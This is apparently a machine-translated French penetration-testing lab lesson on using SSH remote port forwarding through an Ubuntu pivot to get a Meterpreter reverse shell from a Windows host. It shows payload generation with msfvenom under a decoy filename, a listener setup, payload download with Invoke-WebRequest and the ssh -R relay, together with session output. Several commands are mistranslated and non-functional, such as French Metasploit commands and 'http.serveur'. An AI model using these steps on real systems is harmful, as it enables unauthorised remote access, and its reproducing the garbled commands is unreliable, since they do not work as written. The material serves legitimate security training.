Transfert de port distant/inversé avec SSH
=======================================

* * * * *

Nous avons vu le transfert de port local, où SSH peut écouter sur notre hôte local et transférer un service sur l'hôte distant vers notre port, et le transfert de port dynamique, où nous pouvons envoyer des paquets à un réseau distant via un hôte pivot. Mais parfois, nous pouvons également souhaiter transférer un service local vers le port distant. Considérons le scénario dans lequel nous pouvons RDP dans l'hôte Windows `Windows A`. Comme on peut le voir dans l'image ci-dessous, dans notre cas précédent, nous pouvions pivoter vers l'hôte Windows via le serveur Ubuntu.

![](https://academy.hackthebox.com/storage/modules/158/33.png)

"Mais que se passe-t-il si nous essayons d'obtenir un shell inversé ?"

La `connexion sortante` pour l'hôte Windows est uniquement limitée au réseau `172.16.5.0/23` . En effet, l'hôte Windows n'a aucune connexion directe avec le réseau sur lequel se trouve l'hôte d'attaque. Si nous démarrons un écouteur Metasploit sur notre hôte d'attaque et essayons d'obtenir un shell inversé, nous ne pourrons pas obtenir une connexion directe ici car le serveur Windows ne sait pas comment acheminer le trafic quittant son réseau (172.16.5.0/ 23) pour atteindre le 10.129.x.x (le réseau Academy Lab).

Il y a plusieurs fois au cours d'un engagement de test d'intrusion où il n'est pas possible d'avoir juste une connexion de bureau à distance. Vous souhaiterez peut-être `charger`/`télécharger` des fichiers (lorsque le presse-papiers RDP est désactivé), `utiliser des exploits` ou  `l'API Windows de bas niveau` à l'aide d'une session Meterpreter pour effectuer une énumération sur l'hôte Windows, ce qui n'est pas possible avec les [exécutables Windows] intégrés (https://lolbas-project.github.io/).

Dans ces cas, nous devrions trouver un hôte pivot, qui est un point de connexion commun entre notre hôte d'attaque et le serveur Windows. Dans notre cas, notre hôte pivot serait le serveur Ubuntu puisqu'il peut se connecter à la fois : `notre hôte d'attaque` et `la cible Windows`. Pour obtenir un `shell Meterpreter` sur Windows, nous allons créer une charge utile HTTPS Meterpreter à l'aide de `msfvenom`, mais la configuration de la connexion inverse pour la charge utile serait l'adresse IP hôte du serveur Ubuntu (`172.16.5.129`). Nous utiliserons le port 8080 sur le serveur Ubuntu pour transférer tous nos paquets inverses vers le port 8000 de nos hôtes d'attaque, où notre écouteur Metasploit s'exécute.

#### Création d'une charge utile Windows avec msfvenom

Créer une charge utile Windows avec msfvenom

```
dsgsec@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InteralIPofPivotHost> -f exe -o backupscript.exe LPORT=8080

[-] Aucune plate-forme n'a été sélectionnée, en choisissant Msf::Module::Platform::Windows à partir de la charge utile
[-] Aucune arche sélectionnée, sélection de l'arche : x64 à partir de la charge utile
Aucun encodeur spécifié, sortie de données utiles brutes
Taille de la charge utile : 712 octets
Taille finale du fichier exe : 7168 octets
Enregistré sous : backupscript.exe

```

#### Configuration et démarrage du multi/handler

Configurer et démarrer le multi/handler

```
msf6 > utiliser exploit/multi/gestionnaire

[*] Utilisation de la charge utile configurée generic/shell_reverse_tcp
msf6 exploit(multi/handler) > définir la charge utile windows/x64/meterpreter/reverse_https
charge utile => windows/x64/meterpreter/reverse_https
exploit msf6 (multi/gestionnaire)> définir lhost 0.0.0.0
lhost => 0.0.0.0
exploit msf6 (multi/gestionnaire)> définir lport 8000
lport => 8000
exploit msf6 (multi/gestionnaire)> exécuter

[*] Démarrage du gestionnaire inverse HTTPS sur https://0.0.0.0:8000

```

Une fois que notre charge utile est créée et que notre écouteur est configuré et en cours d'exécution, nous pouvons copier la charge utile sur le serveur Ubuntu à l'aide de la commande `scp` puisque nous avons déjà les informations d'identification pour nous connecter au serveur Ubuntu à l'aide de SSH.

#### Transfert de la charge utile vers l'hôte pivot

Transfert de la charge utile vers l'hôte pivot

```
dsgsec@htb[/htb]$ scp backupscript.exe ubuntu@<ipAddressofTarget> :~/

backupscript.exe 100% 7168 65.4KB/s 00:00

```

Après avoir copié la charge utile, nous allons démarrer un `serveur HTTP python3` à l'aide de la commande ci-dessous sur le serveur Ubuntu dans le même répertoire où nous avons copié notre charge utile.

#### Démarrage du serveur Web Python3 sur l'hôte pivot

Démarrage du serveur Web Python3 sur l'hôte pivot

```
ubuntu@Webserver$ python3 -m http.serveur 8123

```

#### Téléchargement de la charge utile à partir de la cible Windows

Nous pouvons télécharger ce `backupscript.exe` à partir de l'hôte Windows via un navigateur Web ou l'applet de commande PowerShell `Invoke-WebRequest`.

Téléchargement de la charge utile à partir de la cible Windows

```
PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"

```

Une fois que nous aurons téléchargé notre charge utile sur l'hôte Windows, nous utiliserons `le transfert de port distant SSH` pour transférer le service d'écoute de notre msfconsole sur le port 8000 vers le port 8080 du serveur Ubuntu. Nous utiliserons l'argument `-vN` dans notre commande SSH pour faire il est verbeux et lui demande de ne pas demander au shell de connexion. La commande `-R` demande au serveur Ubuntu d'écouter sur `<targetIPaddress>:8080` et de transférer toutes les connexions entrantes sur le port `8080` à notre écouteur msfconsole sur `0.0.0.0:8000` de notre `hôte d'attaque`.

#### Utilisation de SSH-R

Utilisation de SSH-R

```
dsgsec@htb[/htb]$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN

```

Après avoir créé le transfert de port distant SSH, nous pouvons exécuter la charge utile à partir de la cible Windows. Si la charge utile est exécutée comme prévu et tente de se reconnecter à notre écouteur, nous pouvons voir les journaux du pivot sur l'hôte pivot.

#### Affichage des journaux à partir du pivot

Affichage des journaux à partir du pivot

```
ebug1 : client_request_forwarded_tcpip : écoute 172.16.5.129 port 8080, expéditeur 172.16.5.19 port 61355
debug1 : connect_next : hôte 0.0.0.0 ([0.0.0.0] :8000) en cours, fd=5
debug1 : canal 1 : nouveau [172.16.5.19]
debug1 : confirmez le TCP transféré
debug1 : canal 0 : libre : 172.16.5.19, nchannels 2
debug1 : canal 1 : connecté au port 0.0.0.0 8000
debug1 : canal 1 : libre : 172.16.5.19, nchannels 1
debug1 : client_input_channel_open : ctype transmis-tcpip rchan 2 win 2097152 max 32768
debug1 : client_request_forwarded_tcpip : écoute 172.16.5.129 port 8080, expéditeur 172.16.5.19 port 61356
debug1 : connect_next : hôte 0.0.0.0 ([0.0.0.0] :8000) en cours, fd=4
debug1 : canal 0 : nouveau [172.16.5.19]
debug1 : confirmez le TCP transféré
debug1 : canal 0 : connecté au port 0.0.0.0 8000

```

Si tout est correctement configuré, nous recevrons un shell Meterpreter pivoté via le serveur Ubuntu.

#### Session Meterpreter établie

Session Meterpreter établie

```
[*] Démarrage du gestionnaire inverse HTTPS sur https://0.0.0.0:8000
[!] https://0.0.0.0:8000 demande de traitement de 127.0.0.1 ; (UUID : x2hakcz9) Sans une base de données connectée, le suivi UUID de la charge utile ne fonctionnera pas !
[*] https://0.0.0.0:8000 demande de traitement de 127.0.0.1 ; (UUID : x2hakcz9) Charge utile x64 intermédiaire (201 308 octets)...
[!] https://0.0.0.0:8000 demande de traitement de 127.0.0.1 ; (UUID : x2hakcz9) Sans une base de données connectée, le suivi UUID de la charge utile ne fonctionnera pas !
[*] Session Meterpreter 1 ouverte (127.0.0.1:8000 -> 127.0.0.1 ) au 2022-03-02 10:48:10 -0500

compteur> shell
Processus 3236 créé.
Canal 1 créé.
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. Tous les droits sont réservés.

C:\>

```

Notre session Meterpreter doit indiquer que notre connexion entrante provient d'un hôte local lui-même (`127.0.0.1`) puisque nous recevons la connexion via le `socket SSH local`, qui a créé une connexion `sortante` vers le serveur Ubuntu. L'exécution de la commande `netstat` peut nous montrer que la connexion entrante provient du service SSH.

La représentation graphique ci-dessous fournit une autre manière de comprendre cette technique.

![](https://academy.hackthebox.com/storage/modules/158/44.png)

En plus de répondre aux questions d'identification, pratiquez cette technique et essayez d'obtenir un shell inversé à partir de la cible Windows.